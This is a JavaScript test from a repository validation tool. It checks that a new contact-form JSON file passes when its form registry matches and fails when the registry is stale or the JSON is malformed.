const quoteForm = `${JSON.stringify({ name: "Quote request", status: "live", fields: [{ id: "email", type: "email", label: "Email", required: true }], button: "Send", thanks: "Thanks, I will reply soon." }, null, 2)}\n`;

test("real git: a new form file with its matching registry passes; a wrong registry or a bad form fails", () => {
  const ok = inRepo(({ write }) => {
    write("src/content/forms/quote.json", quoteForm);
    write(REGISTRY_PATH, registrySource(["quote"]));
  });
  assert.doesNotMatch(ok.report, /Tier 3/, ok.report);
  assert.doesNotMatch(ok.report, /form registry/);
  const stale = inRepo(({ write }) => {
    write("src/content/forms/quote.json", quoteForm);
    write(REGISTRY_PATH, registrySource(["contact"]));
  });
  assert.equal(stale.code, 1, stale.report);
  assert.match(stale.report, /form registry does not match the form files/);
  const broken = inRepo(({ write }) => {
    write("src/content/forms/quote.json", "{ not json");
    write(REGISTRY_PATH, registrySource(["quote"]));
  });
  assert.equal(broken.code, 1, broken.report);
  assert.match(broken.report, /src\/content\/forms\/quote\.json: is not valid JSON/);
});
